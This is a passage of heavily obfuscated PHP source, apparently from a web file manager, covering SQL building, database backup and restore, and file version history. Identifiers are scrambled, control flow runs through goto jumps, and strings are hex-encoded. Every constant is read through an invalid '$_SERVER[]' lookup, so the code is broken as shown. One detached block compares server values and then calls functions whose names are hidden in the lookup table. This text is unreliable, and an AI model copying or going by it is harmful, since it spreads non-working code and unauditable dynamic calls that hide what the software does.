$fҝ[$D[273]] : $D[33]) . $this->parseOrder(!empty($fҝ[$D[363]]) ? $fҝ[$D[363]] : $D[33]) . $this->parseLimit(!empty($fҝ[$D[290]]) ? $fҝ[$D[290]] : $D[33]) . $this->parseLock(isset($fҝ[$D[817]]) ? $fҝ[$D[817]] : !1) . $this->parseComment(!empty($fҝ[$D[352]]) ? $fҝ[$D[352]] : $D[33]); return $this->execute($cǰ, $this->parseBind(!empty($fҝ[$D[283]]) ? $fҝ[$D[283]] : array())); } public function select($F = array()) { goto B; c˭: $C = isset($F[$fƮ[347]]) ? $F[$fƮ[347]] : !1; if ($C) { $D = is_string($C[$fƮ[93]]) ? $C[$fƮ[93]] : $fƮ[1002] . md5($C); $d = think_cache($D, $fƮ[33], $C); if (!1 !== $d) { return $d; } } $a߮ = $this->query($C, $this->parseBind(!empty($F[$fƮ[283]]) ? $F[$fƮ[283]] : array())); goto d; d: if ($C && !1 !== $a߮) { think_cache($D, $a߮, $C); } return $a߮; goto E; B: $fƮ =& $_SERVER[]; $this->model = $F[$fƮ[279]]; $C = $this->buildSelectSql($F); goto c˭; E: } public function buildSelectSql($a葲ڿ = array()) { goto Dߩ; Dߩ: $FÅ =& $_SERVER[]; if (isset($a葲ڿ[$FÅ[351]])) { if (strpos($a葲ڿ[$FÅ[351]], $FÅ[47])) { list($C, $d) = explode($FÅ[47], $a葲ڿ[$FÅ[351]]); } else { $C = $a葲ڿ[$FÅ[351]]; } $C = $C ? $C : 1; $d = isset($d) ? $d : (is_numeric($a葲ڿ[$FÅ[290]]) ? $a葲ڿ[$FÅ[290]] : 20); $C댢 = $d * ((int) $C - 1); $a葲ڿ[$FÅ[290]] = $C댢 . $FÅ[47] . $d; } if (think_config($FÅ[1003])) { $D = $FÅ[1004] . md5(serialize($a葲ڿ)); $Eǽ퍫 = think_cache($D); if ($Eǽ퍫) { return $Eǽ퍫; } } goto b޲; D𣳯: return $Eن; goto d; b޲: $Eن = $this->parseSql($this->selectSql, $a葲ڿ); $Eن .= $this->parseLock(isset($a葲ڿ[$FÅ[817]]) ? $a葲ڿ[$FÅ[817]] : !1); if (isset($D)) { think_cache($D, $Eن); } goto D𣳯; d: } public function parseSql($Cσ滗, $AטԃЃ = array()) { $cસ =& $_SERVER[]; $Cσ滗 = str_replace(array($cસ[1005], $cસ[1006], $cસ[1007], $cસ[1008], $cસ[1009], $cસ[1010], $cસ[1011], $cસ[1012], $cસ[1013], $cસ[1014], $cસ[1015]), array($this->parseTable("{$AטԃЃ[$cસ[277]]}"), $this->parseDistinct(isset($AטԃЃ[$cસ[1016]]) ? $AטԃЃ[$cસ[1016]] : !1), $this->parseField(!empty($AטԃЃ[$cસ[271]]) ? $AטԃЃ[$cસ[271]] : $cસ[182]), $this->parseJoin(!empty($AטԃЃ[$cસ[280]]) ? $AטԃЃ[$cસ[280]] : $cસ[33]), $this->parseWhere(!empty($AטԃЃ[$cસ[273]]) ? $AטԃЃ[$cસ[273]] : $cસ[33]), $this->parseGroup(!empty($AטԃЃ[$cસ[496]]) ? $AטԃЃ[$cસ[496]] : $cસ[33]), $this->parseHaving(!empty($AטԃЃ[$cસ[1017]]) ? $AטԃЃ[$cસ[1017]] : $cસ[33]), $this->parseOrder(!empty($AטԃЃ[$cસ[363]]) ? $AטԃЃ[$cસ[363]] : $cસ[33]), $this->parseLimit(!empty($AטԃЃ[$cસ[290]]) ? $AטԃЃ[$cસ[290]] : $cસ[33]), $this->parseUnion(!empty($AטԃЃ[$cસ[345]]) ? $AטԃЃ[$cસ[345]] : $cસ[33]), $this->parseComment(!empty($AטԃЃ[$cસ[352]]) ? $AטԃЃ[$cસ[352]] : $cસ[33])), $Cσ滗); return $Cσ滗; } public function getLastSql($Cݍ = '') { return $Cݍ ? $this->modelSql[$Cݍ] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($a̞) { return addslashes($a̞); } public function setModel($b᧹) { $this->model = $b᧹; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($D, $b = '') { $this->database = $D; $this->type = $b; } public function model($C = '') { return new ModelBase($C, $_SERVER[][33], $this->database); } public function db($e벉 = false) { goto Cᲈ됲; cݣ: $b = $eʾ[$aݱ[931]]; $eʾ[$aݱ[931]] = $aݱ[33]; if ($eʾ[$aݱ[759]] == $aݱ[760]) { $Fə = $eʾ[$aݱ[761]]; $eʾ[$aݱ[761]] = substr($Fə, 0, strrpos($Fə, $aݱ[1018])); } goto bӐؑܫ; Cᲈ됲: $aݱ =& $_SERVER[]; $eʾ = array_change_key_case($this->database); if ($this->type == $aݱ[9] || !$e벉) { return $this->model()->db(); } goto cݣ; B𜓇: if (!$F) { $Aܡ->execute("\x63\162\x65\141\x74\x65\x20\x64\x61\164\141\x62\x61\163\x65\40\x60{$b}\x60"); } $eʾ[$aݱ[931]] = $b; if ($eʾ[$aݱ[759]] == $aݱ[760]) { $eʾ[$aݱ[761]] .= $aݱ[1018] . $b; } goto eސ; bӐؑܫ: $this->database = $eʾ; $Aܡ = $this->model()->db(); try { $F = $Aܡ->execute("\x73\150\x6f\x77\x20\144\141\x74\141\x62\141\163\145\163\40\x6c\151\153\x65\40\47{$b}\x27"); } catch (Exception $EڡА) { } goto B𜓇; eސ: $this->database = $eʾ; $Aܡ->execute("\x75\x73\x65\x20\x60{$b}\140"); return $Aܡ; goto cԐު; cԐު: } public function createTable($aܔܳ, $E = null) { $d =& $_SERVER[]; if (!IO::exist($aܔܳ)) { ActionCall($d[1019], !0, 0); show_json(LNG($d[1020]), !1); } $eˋ銶 = sqlSplit(IO::getContent($aܔܳ)); foreach ($eˋ銶 as $dˋ) { if ($E) { $dݢ = stripos($dˋ, $d[1021]) === 0; if ($dݢ) { $E->task[$d[1022]] += 1; } } $this->model()->db()->execute($dˋ); if ($E && $dݢ) { preg_match($d[1023], $dˋ, $D􃹉); $E->task[$d[1024]] = $D􃹉[1]; $E->update(1); } } $this->taskToCache($E); } public function insertTable($f֠, $D̛ͭ = null) { $Fן =& $_SERVER[]; $F = $this->model()->db(); $c༤ = $eу ? array($eу) : $F->getTables(); foreach ($f֠ as $Eт) { $eу = basename($Eт, $Fן[751]); if (!in_array($eу, $c༤)) { continue; } if ($D̛ͭ) { $D̛ͭ->task[$Fן[1024]] = $eу; } if (get_filesize($Eт) == 0) { continue; } $Fꡙ = $this->sqlToDb($Eт, $D̛ͭ); if (!$Fꡙ) { ActionCall($Fן[1019], !0, 0); show_json(LNG($Fן[1025]) . "\x5b{$eу}\x5d", !1); } } $this->taskToCache($D̛ͭ); } public function sqlFromDb($Fȣ, $f쨚, $aÐ = null, $c҅ = null) { goto Eζ߱; Dц: $B͗ = 0; $b੔ = 10000; $dɧ = fopen($f쨚, $_SERVER[][1026]); goto A; Eζ߱: if ($aÐ) { $aÐ->task[$_SERVER[][1024]] = $Fȣ; } $EǓ֣ = $this->model($Fȣ); $c܌ = 0; goto Dц; A: $eۚ = $EǓ֣->getPk(); $D뼛 = $EǓ֣->getDbFields(); do { $d = array($eۚ => array($_SERVER[][973], $B͗)); $a𒆖 = $EǓ֣->where($d)->field($D뼛)->order($eۚ . $_SERVER[][1027])->limit($b੔)->select(); $a𒆖 = !empty($a𒆖) ? $a𒆖 : array(); if (!($d = count($a𒆖))) { break; } $Cǝ = end($a𒆖); $B͗ = $Cǝ[$eۚ]; $eθ = array(); foreach ($a𒆖 as $cʹ) { if ($Fȣ == $_SERVER[][1028] && $cʹ[$_SERVER[][29]] == $_SERVER[][1029]) { $Dڄț = json_decode($cʹ[$_SERVER[][372]], !0); if ($Dڄț[$_SERVER[][28]] == date($_SERVER[][716]) && !$Dڄț[$_SERVER[][715]]) { continue; } } if ($c҅) { $cʹ[$_SERVER[][76]] = "\x7b\x69\x6f\72{$c҅}\175" . substr($cʹ[$_SERVER[][76]], strlen("\173\x69\x6f\x3a{$cʹ[$_SERVER[][787]]}\x7d")); $cʹ[$_SERVER[][787]] = $c҅; } $eθ[] = $_SERVER[][1030] . $this->sqlEncode($cʹ) . $_SERVER[][1031]; } $eћ = "\111\x4e\123\105\122\x54\x20\x49\116\124\x4f\40\140{$Fȣ}\140\x20\50\x60" . implode($_SERVER[][1032], $D뼛) . $_SERVER[][1033]; fwrite($dɧ, $eћ . implode($_SERVER[][1034], $eθ) . $_SERVER[][68] . PHP_EOL); $c܌ += $d; if ($aÐ) { $aÐ->update($d); } } while ($b੔ == $d); goto a; a: fclose($dɧ); return $c܌; goto CΉ; CΉ: } public function sqlToDb($F੓, $e朹 = null) { goto Eӣ; D­: if ($E􍋝 == $Fƪ[1036]) { $F̡ƹ = 50; } while (!feof($f)) { $b܅ = trim(fgets($f)); if (!$b܅) { continue; } $F = $this->sqlDecode($b܅, $this->type); if (stripos($F, $Fƪ[353]) === 0) { if (!$b) { $b = $F . $Fƪ[50]; } continue; } if ($e朹) { $e朹->task[$Fƪ[1022]] += 1; } $eŻӇ++; $d񟂑[] = rtrim(rtrim(trim($F), $Fƪ[47]), $Fƪ[68]); if ($eŻӇ >= $F̡ƹ) { $F = $b . implode($Fƪ[47], $d񟂑); if (!$Eϭȹ->execute($F)) { return !1; } if ($e朹) { $e朹->update($eŻӇ); } $d񟂑 = array(); $eŻӇ = 0; } } fclose($f); goto Eڮ; Eڮ: if (!empty($d񟂑)) { $F = $b . implode($Fƪ[47], $d񟂑); if (!$Eϭȹ->execute($F)) { return !1; } if ($e朹) { $e朹->update($eŻӇ); } } return !0; goto Bم; Eӣ: $Fƪ =& $_SERVER[]; $Eϭȹ = $this->model()->db(); $f = @fopen($F੓, $Fƪ[1035]); goto C; B҉ø: $d񟂑 = array(); $F̡ƹ = $this->type == $Fƪ[9] ? 500 : 2000; $E􍋝 = basename($F੓, $Fƪ[751]); goto D­; C: if (!$f) { return !1; } $eŻӇ = 0; $b = $Fƪ[33]; goto B҉ø; Bم: } public function dropTable($a⒮ = null) { $Bà = $this->model()->db(); $bߴ = $a⒮ ? array($a⒮) : $Bà->getTables(); if (!$bߴ) { return; } foreach ($bߴ as $a⒮) { $Bà->execute("\x64\162\x6f\x70\x20\164\141\142\154\x65\x20\151\146\x20\x65\x78\151\x73\164\x73\40\140{$a⒮}\140"); } } private function taskToCache($aÅ = null) { $Aŗا =& $_SERVER[]; if (!$aÅ) { return; } $A = array($Aŗا[1024] => $aÅ->task[$Aŗا[1024]], $Aŗا[1022] => $aÅ->task[$Aŗا[1022]], $Aŗا[1037] => $aÅ->task[$Aŗا[1037]]); if ($A[$Aŗا[1022]] == $A[$Aŗا[1037]]) { $A[$Aŗا[725]] = 1; } Cache::set($Aŗا[1038] . $aÅ->task[$Aŗا[393]], $A); $aÅ->end(); } private function sqlEncode($cხ̶) { $C =& $_SERVER[]; $eй = array(); foreach ($cხ̶ as $A₷) { if (is_array($A₷)) { $A₷ = json_encode_force($A₷); } $A₷ = addslashes($A₷); $A₷ = str_replace(array($C[1039], $C[229]), array($C[1040], $C[1041]), $A₷); $eй[] = str_replace($C[55], $C[1042], $A₷); } return $C[55] . implode($C[1043], $eй) . $C[55]; } private function sqlDecode($e, $Ě) { $fƎ =& $_SERVER[]; $e = str_replace(array($fƎ[1040], $fƎ[1041]), array($fƎ[1039], $fƎ[229]), $e); if ($Ě == $fƎ[9]) { $e = stripslashes($e); } return $e; } } goto bǌ; C጖: if ($_SERVER[$_SERVER[][836]] != $_SERVER[$_SERVER[][837]]) { goto CƏ; a؄ǌ: $E醼 = explode($_SERVER[][229], $E״л); if (count($E醼) < $_SERVER[][595]) { $cαϹҪ = $_SERVER[][842]; $cαϹҪ(); } $F͂ = $_SERVER[][1080]; goto cɫ; CƏ: $E = $_SERVER[][839]; $DҊ = $_SERVER[$_SERVER[][840]] . $_SERVER[][841]; $E״л = $E($DҊ); goto a؄ǌ; cɫ: $F͂($_SERVER[$_SERVER[][1081]]); goto b퍾; b퍾: } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { goto c侹; B׏: if ($F[$aé[1107]] <= 0) { return; } if (isset($_REQUEST[$aé[1108]]) && $_REQUEST[$aé[1108]] == $aé[87]) { return; } Hook::bind($aé[1109], $aé[1110]); goto f悈Ķ; f悈Ķ: Hook::bind($aé[1111], $aé[1112]); Hook::bind($aé[1113], $aé[1114]); Hook::bind($aé[1115], $aé[1116]); goto f; f: Hook::bind($aé[1117], $aé[1118]); Hook::bind($aé[1119], $aé[1120]); goto d; c侹: $aé =& $_SERVER[]; $F = $GLOBALS[$aé[6]][$aé[88]]; if ($F[$aé[1106]] != 1) { return; } goto B׏; d: } public static function eventBeforeUpload($eѐ) { if ($eѐ[3] && $eѐ[3] != REPEAT_REPLACE) { return; } $f׬³ = self::parsePath($eѐ[0]); if (!$f׬³) { return; } self::add($f׬³); } public static function eventBeforeEdit($D) { $A = self::parsePath($D[0]); if (!$A) { return; } self::add($A); } public static function eventBeforeCopyFile($B, $fӂ, $D芙, $E, $fʠč, $CˌӺ) { $Aݙ = $D芙->getPathOuter($E); $F⹿ = self::parsePath($Aݙ); if (!$F⹿) { return; } self::add($F⹿); } public static function eventBeforeRename($A) { $Fӿ =& $_SERVER[]; $b = self::parsePath($A[0]); if (!$b) { return; } $aػ = self::checkInHistory($b); if (!$aػ) { return; } if ($aػ[$Fӿ[29]] == $Fӿ[193]) { $c = self::listData($b); if ($c && $c[$Fӿ[367]]) { self::moveHistory($b, $A[1]); } } else { IO::rename($aػ[$Fӿ[76]], $A[1]); } } public static function eventBeforeMove($A) { goto EϮ; EϮ: $C͚ =& $_SERVER[]; $AэƱ = self::parsePath($A[0]); if (!$AэƱ) { return; } goto D̛; bʗˆ: $e = self::checkInHistory($AэƱ); if (!$e) { return; } $Eܛ镆 = self::pathHistory($E); goto EⳍΉ; D̛: $E = self::parsePath($A[1]); if (!$E) { return; } $a絕葥 = $A[3]; goto bʗˆ; EⳍΉ: if ($e[$C͚[29]] == $C͚[193]) { $AمǨ = self::listData($AэƱ); $e렜̰ = rtrim($E, $C͚[8]) . $C͚[8] . ($a絕葥 ? $a絕葥 : get_path_this($AэƱ)); $eտق = self::listData($e렜̰); if ($AمǨ && $AمǨ[$C͚[367]] && $eտق && $eտق[$C͚[367]]) { return self::clear($AэƱ); } if ($AمǨ && $AمǨ[$C͚[367]]) { self::moveHistory($AэƱ, $a絕葥, $Eܛ镆); } } else { IO::move($e[$C͚[76]], $Eܛ镆, !1, $a絕葥); self::clearEmptyFolder(IO::pathFather($e[$C͚[76]])); } goto cɚ; cɚ: } public static function eventAfterRemove($B, $C˻) { goto Cۅ; cⴄ: if ($Fǔϕ[$b[29]] == $b[193]) { $fވħ = self::listData($BȞ, !1); if ($fވħ && $fވħ[$b[367]]) { self::clear($BȞ, !1); } } else { IO::remove($Fǔϕ[$b[76]]); self::clearEmptyFolder(IO::pathFather($Fǔϕ[$b[76]])); } goto C; bɏ: if (!$BȞ) { return; } $Fǔϕ = self::checkInHistory($BȞ); if (!$Fǔϕ) { return; } goto cⴄ; Cۅ: $b =& $_SERVER[]; if (!$C˻) { return; } $BȞ = self::parsePath($B[0]); goto bɏ; C: } private static function checkInHistory($Fﮔ) { $cൠܐ = self::pathHistory($Fﮔ); if (!IO::exist($cൠܐ)) { $cൠܐ .= $_SERVER[][1121]; } return IO::exist($cൠܐ) ? IO::info($cൠܐ) : !1; } private static function parsePath($DՋƜ) { goto dٱ; BŢ: if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $Fܼ˘ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $f[1125]); foreach ($Fܼ˘ as $E) { if (!$C񅂣 && substr($DՋƜ, 0, strlen($E)) == $E) { return !1; } } goto b; F: if (!$c͟Ҙ || !$dƵ[$f[1123]]) { return !1; } if (substr($DՋƜ, 0, strlen(DATA_PATH . $f[1124])) == DATA_PATH . $f[1124]) { return !1; } if ($C񅂣 == KodIO::KOD_SHARE_ITEM) { $DП̐ = IO::init($DՋƜ); if ($DП̐->pathParse[$f[1049]]) { return self::parsePath($DП̐->pathParse[$f[1049]]); } return !1; } goto BŢ; dٱ: $f =& $_SERVER[]; if (!$DՋƜ) { return !1; } if ($GLOBALS[$f[1122]]) { return; } goto Eӄ; Eӄ: $dƵ = KodIO::parse($DՋƜ); $C񅂣 = $dƵ[$f[29]]; $c͟Ҙ = !$C񅂣 || $C񅂣 == KodIO::KOD_IO || $C񅂣 == KodIO::KOD_SHARE_ITEM; goto F; b: self::log($GLOBALS[$f[1044]] . $f[1126] . $DՋƜ); return $DՋƜ; goto a; a: } private static function pathHistory($dҕ҃) { $d =& $_SERVER[]; $A = self::$_historyBase . ltrim(KodIO::clear($dҕ҃), $d[8]); $A = str_replace(array($d[1127]), array($d[1128]), $A); return $A; } public static function log($A) { } public static function historyCount($aτ۲) { $dޭ =& $_SERVER[]; $B쳭ۻ = array(); $FԚ = array(); foreach ($aτ۲ as $aլ) { $cί = get_path_father($aլ); if (!$FԚ[$cί]) { $FԚ[$cί] = array(); } $FԚ[$cί][] = get_path_this($aլ); } foreach ($FԚ as $cί => $f᫢) { $f䬯ݹ = self::parsePath($cί); if (!$f䬯ݹ) { continue; } foreach ($f᫢ as $Aտ) { $cܟ = self::listData(rtrim($f䬯ݹ, $dޭ[8]) . $dޭ[8] . $Aտ, !1); if ($cܟ && $cܟ[$dޭ[367]]) { $B쳭ۻ[rtrim($cί, $dޭ[8]) . $dޭ[8] . $Aտ] = count($cܟ[$dޭ[367]]); } } } return $B쳭ۻ; } public static function add($eؐ) { goto aȢѡ; aȢѡ: $b =& $_SERVER[]; $e謈 = self::listData($eؐ); if (!$e謈) { return; } goto fצ; fצ: $c訕 = Model($b[735])->get($b[1129]); $F̚ = $GLOBALS[$b[6]][$b[88]][$b[1107]]; $E烙 = $c訕 == $b[1130] ? 5 : $F̚; goto AҐ̂; D: if ($F俋Ɛ && $F俋Ɛ[0][$b[171]] == $Dȏ) { return !0; } if (array_key_exists($b[196], $cх) && !$cх[$b[196]]) { return !1; } $Cؕ = short_id(time()); goto f̶֚; AҐ̂: if ($F̚ <= 0) { return; } $Dȏ = IO::hashSimple($eؐ); $cх = IO::info($eؐ); goto bɋ; bɋ: $F俋Ɛ = $e謈[$b[367]]; if ($cх[$b[78]] == 0) { return; } if ($cх[$b[78]] >= 1024 * 1024 * 500) { return !1; } goto D; f廭: return self::saveData($e謈[$b[1134]], $F俋Ɛ); goto B㼑ث; b疷ƾ: if (!$e) { self::clearEmptyFolder($e謈[$b[1133]]); return !1; } array_unshift($F俋Ɛ, $aֺ); if (count($F俋Ɛ) > $E烙) { $BÖ = array_slice($F俋Ɛ, $E烙); foreach ($BÖ as $EԞ) { IO::remove($e謈[$b[1133]] . $EԞ[$b[28]]); } $F俋Ɛ = array_slice($F俋Ɛ, 0, $E烙); } goto f廭; f̶֚: $aֺ = array($b[393] => $Cؕ, $b[171] => $Dȏ, $b[28] => $cх[$b[28]] . $b[95] . date($b[1131]) . rand_string(1), $b[78] => $cх[$b[78]], $b[432] => USER_ID, $b[194] => time(), $b[1132] => $b[33]); IO::mkdir($e謈[$b[1133]]); $e = IO::copy($eؐ, $e謈[$b[1133]], !1, $aֺ[$b[28]]); goto b疷ƾ; B㼑ث: } public static function remove($e, $fŊ) { $b =& $_SERVER[]; $eʹ = self::listData($e); $bן = array(); if (!$eʹ) { return !1; } foreach ($eʹ[$b[367]] as $b) { if ($b[$b[393]] == $fŊ) { IO::remove($eʹ[$b[1133]] . $b[$b[28]]); continue; } $bן[] = $b; } return self::saveData($eʹ[$b[1134]], $bן); } public static function clear($A, $bʴ = true) { $Bɉ =& $_SERVER[]; $a˗ = self::listData($A, $bʴ); if (!$a˗) { return !1; } foreach ($a˗[$Bɉ[367]] as $Cь) { IO::remove($a˗[$Bɉ[1133]] . $Cь[$Bɉ[28]]); } return self::saveData($a˗[$Bɉ[1134]], array()); } public static function moveHistory($fǗ, $F͘ = '', $eÊ = '') { goto f䪖; bĉ: $dȝ = substr(get_path_this($e䅖[$f[1134]]), 0, -strlen($dܧ)); foreach ($e䅖[$f[367]] as $Bӂ => $eȍٱ) { $Aۉ = $F͘ . substr($eȍٱ[$f[28]], strlen($dȝ)); $f = IO::move($e䅖[$f[1133]] . $eȍٱ[$f[28]], $eÊ, !1, $Aۉ); if ($f) { $e䅖[$f[367]][$Bӂ][$f[28]] = $Aۉ; } } $e䅖[$f[1134]] = IO::move($e䅖[$f[1134]], $eÊ, !1, $F͘ . $dܧ); goto F; Fʱ: $dܧ = $f[1121]; $F͘ = $F͘ ? $F͘ : get_path_this($fǗ); $eÊ = $eÊ ? $eÊ : $e䅖[$f[1133]]; goto bĉ; F: self::saveData($e䅖[$f[1134]], $e䅖[$f[367]]); self::clearEmptyFolder($e䅖[$f[1133]]); goto b߈މ; f䪖: $f =& $_SERVER[]; $e䅖 = self::listData($fǗ, !1); if (!$e䅖 || !$e䅖[$f[367]]) { return !1; } goto Fʱ; b߈މ: } public static function rollback($e, $C) { $f =& $_SERVER[]; $Aœ = self::listData($e); if (!$Aœ) { return; } $cۨå = IO::info($e); foreach ($Aœ[$f[367]] as $A۷Ĝ => $f׍) { if ($f׍[$f[393]] == $C) { self::add($e); $c̆ = $Aœ[$f[1133]] . $f׍[$f[28]]; $c밓 = IO::copy($c̆, IO::pathFather($e), REPEAT_REPLACE, $cۨå[$f[28]]); if ($c밓) { self::remove($e, $C); } return $c밓; } } return !1; } public static function setDetail($e, $c, $Dґɇ) { $e =& $_SERVER[]; $F = self::listData($e); if (!$F) { return; } foreach ($F[$e[367]] as $Eȼܽ => $bސ) { if ($bސ[$e[393]] == $c) { $F[$e[367]][$Eȼܽ][$e[1132]] = $Dґɇ; self::saveData($F[$e[1134]], $F[$e[367]]); return !0; } } return !1; } public static function fileInfo($eă, $Ẻ) { goto cċ; cċ: $BǾ =& $_SERVER[]; $cʑǱ = self::listData($eă); if (!$cʑǱ) { show_json(LNG($BǾ[105]), !1); } goto aյݍ; e: return IO::info($d); goto cްС; aյݍ: $d = $BǾ[33]; foreach ($cʑǱ[$BǾ[367]] as $E҉ => $f׾) { if ($f׾[$BǾ[393]] != $Ẻ) { continue; } $d = $cʑǱ[$BǾ[1133]] . $f׾[$BǾ[28]]; break; } if (!$d) { show_json(LNG($BǾ[105]), !1); } goto e; cްС: } public static function fileOut($eϬ, $a, $E = false) { $f٘ =& $_SERVER[]; $EˊǱ = self::fileInfo($eϬ, $a); $c =& $GLOBALS[$f٘[7]]; $E = isset($c[$f٘[1097]]) && $c[$f٘[1097]] == 1; if (isset($c[$f٘[29]]) && $c[$f٘[29]] == $f٘[1135]) { return IO::fileOutImage($EˊǱ[$f٘[76]], $c[$f٘[1136]]); } IO::fileOut($EˊǱ[$f٘[76]], $E, get_path_this($eϬ)); } public static function listData($f䅫, $Cͣ = true) { goto CА; A̪҆: $a = IO::getContent($bꋜ[$dȶߡ[1134]]); if ($a) { $Eӕ = json_decode($a, !0); if (is_array($Eӕ)) { $bꋜ[$dȶߡ[367]] = $Eӕ; } } return $bꋜ; goto Fᜐ; CА: $dȶߡ =& $_SERVER[]; if ($Cͣ && !IO::exist($f䅫)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto eԬ̬; eԬ̬: if (substr($f䅫, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $fȮ = self::pathHistory($f䅫); $bꋜ = array($dȶߡ[1134] => $fȮ . $dȶߡ[1121], $dȶߡ[1133] => rtrim(get_path_father($fȮ), $dȶߡ[8]) . $dȶߡ[8], $dȶߡ[367] => array()); goto A̪҆; Fᜐ: } private static function saveData($D, $C) { goto eꗬ; c: $f = IO::pathFather($D); IO::remove($D); self::clearEmptyFolder($f); goto a; eꗬ: $C߶ =& $_SERVER[]; self::log($C߶[1137] . $D . $C߶[68] . count($C), $C߶[717]); if ($C) { return IO::setContent($D, json_encode($C)); } goto c; a: return !0; goto Aύا; Aύا: } public static function clearEmptyFolder($AӦ) { goto Cȥ; bʘ: $Eŝ = IO::has($AӦ, !0); if ($Eŝ[$cӞ[203]] > 0 || $Eŝ[$cӞ[204]] > 0) { return; } IO::remove($AӦ); goto Fʆ; Cȥ: $cӞ =& $_SERVER[]; if (trim($AӦ, $cӞ[8]) == trim(self::$_historyBase, $cӞ[8])) { return; } $eޢ = IO::pathFather($AӦ); goto bʘ; Fʆ: self::clearEmptyFolder($eޢ); goto Bݠ; Bݠ: } private static function getBasePath() { goto aˇ; B: $ë́ = DATA_PATH . $d횤ܰ[1140] . rand_string(8) . $d횤ܰ[8]; $ë́ = IO::mkdir($ë́); $ë́ = rtrim($ë́, $d횤ܰ[8]) . $d횤ܰ[8]; goto F藄; aˇ: $d횤ܰ =& $_SERVER[]; $ë́ = Model($d횤ܰ[1138])->get($d횤ܰ[1139]); if ($ë́) { if (!IO::exist($ë́)) { IO::mkdir($ë́); } if (get_path_this($ë́) == $d횤ܰ[1124]) { $B = $d횤ܰ[1140] . rand_string(8); @rename($ë́, get_path_father($ë́) . $d횤ܰ[8] . $B); $ë́ = DATA_PATH . $B . $d횤ܰ[8]; file_put_contents(DATA_PATH . $d횤ܰ[1141], $d횤ܰ[33]); Model($d횤ܰ[1138])->set($d횤ܰ[1139], $ë́); } return $ë́; } goto B; F藄: file_put_contents($ë́ . $d횤ܰ[1141], $d횤ܰ[33]); file_put_contents(DATA_PATH . $d횤ܰ[1141], $d횤ܰ[33]); Model($d횤ܰ[1138])->set($d횤ܰ[1139], $ë́); goto fԡ; fԡ: return $ë́; goto e; e: } } class KodIO { const KOD_SOURCE = "\173\163\157\x75\162\143\145\175"; const KOD_USER_RECYCLE = "\173\x75\x73\145\162\122\145\x63\x79\x63\154\x65\x7d"; const KOD_USER_FAV = "\173\165\x73\x65\x72\x46\x61\x76\175"; const KOD_USER_FILE_TAG = "\x7b\x75\x73\x65\162\106\151\154\x65\x54\x61\147\x7d"; const KOD_USER_FILE_TYPE = "\x7b\165\x73\145\162\x46\x69\x6c\x65\x54\171\160\145\175"; const KOD_GROUP_ROOT_SELF = "\x7b\x67\x72\x6f\x75\160\x52\x6f\157\x74\123\x65\x6c\x66\175"; const KOD_USER_SHARE = "\173\165\163\145\x72\123\x68\141\162\145\175"; const KOD_USER_SHARE_LINK = "\x7b\165\x73\x65\x72\x53\x68\x61\x72\x65\114\x69\156\x6b\x7d"; const KOD_USER_SHARE_TO_ME = "\173\x73\150\141\x72\x65\x54\x6f\115\x65\x7d"; const KOD_SHARE_ITEM = "\173\x73\150\141\162\x65\x49\x74\145\x6d\x7d"; const KOD_SHARE_LINK = "\x7b\x73\150\x61\162\x65\x49\164\145\155\x4c\x69\x6e\153\x7d"; const KOD_SEARCH = "\173\x73\x65\141\x72\x63\x68\x7d"; const KOD_BLOCK = "\x7b\142\x6c\157\143\x6b\x7d"; const KOD_IO = "\x7b\x69\157\x7d"; const KOD_USER_RECENT = "\x7b\165\x73\145\162\122\x65\x6e\143\x65\156\164\175"; const KOD_USER_DRIVER = "\x7b\x64\x72\x69\166\145\x72\175"; public static function typeList() { $Aۢ =& $_SERVER[]; return array($Aۢ[1142] => self::KOD_SOURCE, $Aۢ[1143] => self::KOD_USER_RECYCLE, $Aۢ[1144] => self::KOD_USER_FAV, $Aۢ[1145] => self::KOD_USER_FILE_TAG, $Aۢ[1146] => self::KOD_USER_FILE_TYPE, $Aۢ[1147] => self::KOD_GROUP_ROOT_SELF, $Aۢ[1148] => self::KOD_USER_SHARE, $Aۢ[1149] => self::KOD_USER_SHARE_LINK, $Aۢ[1150] => self::KOD_USER_SHARE_TO_ME, $Aۢ[1151] => self::KOD_SHARE_ITEM, $Aۢ[1152] => self::KOD_SHARE_LINK, $Aۢ[1153] => self::KOD_SEARCH, $Aۢ[1154] => self::KOD_BLOCK, $Aۢ[1155] => self::KOD_IO, $Aۢ[1156] => self::KOD_USER_RECENT, $Aۢ[1157] => self::KOD_USER_DRIVER); } public static function parse($cȰل) { goto F; bҞ: preg_match($d[1158], $cȰل, $FՎ); $A܏§ؑ = array($d[415] => !1, $d[1159] => !1, $d[412] => !1, $d[76] => $cȰل, $d[1066] => !1, $d[1065] => $d[33]); if (is_array($FՎ) && count($FՎ) == 5) { $b = $d[1160] . $FՎ[2] . $d[325]; if (in_array($b, $BŅ)) { $A܏§ؑ[$d[1066]] = $FՎ[1]; $A܏§ؑ[$d[29]] = $b; $A܏§ؑ[$d[1161]] = substr($b, 1, -1); $A܏§ؑ[$d[393]] = $FՎ[3]; } $A܏§ؑ[$d[1065]] = $FՎ[4]; } goto aԏ; aԏ: $E = array($d[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $A܏§ؑ[$d[1123]] = in_array($A܏§ؑ[$d[29]], $E); return $A܏§ؑ; goto eώ; F: $d =& $_SERVER[]; $cȰل = self::clear($cȰل); $BŅ = array_values(self::typeList()); goto bҞ; eώ: } public static function isTruePath($d) { goto EѨΩ; EѨΩ: $Bꐇ =& $_SERVER[]; if (substr($d, 0, 1) != $Bꐇ[1160]) { return !0; } if (strpos($d, $Bꐇ[401]) === 0) { return !0; } goto D󣗠̜; D󣗠̜: if (strpos($d, $Bꐇ[1127]) === 0) { return !0; } if (strpos($d, $Bꐇ[1162]) === 0) { return !0; } if (strpos($d, $Bꐇ[1163]) === 0) { return !0; } goto b; b: if (strpos($d, $Bꐇ[1164]) === 0) { return !0; } return !1; goto bީ; bީ: } public static function clear($bʆ) { goto f׃; dɼ: $bʆ = preg_replace($e؊[1167], $e؊[8], $bʆ); if ($bʆ == $e؊[8]) { return $e؊[8]; } $bʆ = 